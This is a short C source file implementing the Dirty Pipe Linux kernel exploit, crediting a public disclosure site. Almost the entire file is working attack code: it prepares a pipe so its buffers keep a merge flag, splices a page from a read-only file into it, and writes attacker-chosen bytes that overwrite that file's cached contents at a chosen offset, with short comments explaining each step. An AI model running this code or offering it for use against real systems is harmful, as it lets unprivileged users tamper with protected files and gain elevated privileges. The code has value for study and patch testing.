/*

Credit: https://dirtypipe.cm4all.com/

*/

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

void dirty_pipe(int p[2]){
    
    if(pipe(p))
        exit(-1);
    
    size_t max_size = fcntl(p[1], F_GETPIPE_SZ); // get the maximum pipe size
    char * buffer = malloc(max_size);
    
    /*fill the pipe (all of the pipe_buffer's) so next pipes will be marked as PIPE_BUF_FLAG_CAN_MERGE*/
    write(p[1], buffer, max_size);
    
    /*flags are not cleared here including PIPE_BUF_FLAG_CAN_MERGE!*/
    read(p[0], buffer, max_size);

}

int main(int argc, char ** argv){
    if(argc != 4){
        printf("usage: %s [filename] [offset] [input]\n", argv[0]);
        return 1;
    }

    size_t data_length = strlen(argv[3]);
    size_t offset = strtoul(argv[2], NULL, 0);
    size_t offset_end = offset + data_length;

    if(offset % PAGE_SIZE == 0){
        printf("can't cross page boundry!\n");
        return 1;
    }

    int fd = open(argv[1], O_RDONLY);

    if(fd < 0) {
        printf("failed to open the file!\n");
        return 1;
    }

    struct stat st;
    if(fstat(fd, &st))
        return 1;
    
    if(st.st_size < offset || st.st_size < offset_end){
        printf("offset can't be bigger than file's size!\n");
        return 1;
    }

    /*poision the pipe buffer*/
    int p[2];
    dirty_pipe(p);
    
    /*splice "connects" a page from a file decriptor to a pipe buffer without copying the whole data*/
    --offset;
    splice(fd, &offset, p[1], NULL, 1, 0);

    write(p[1], argv[3], data_length); 
    
    return 0;
}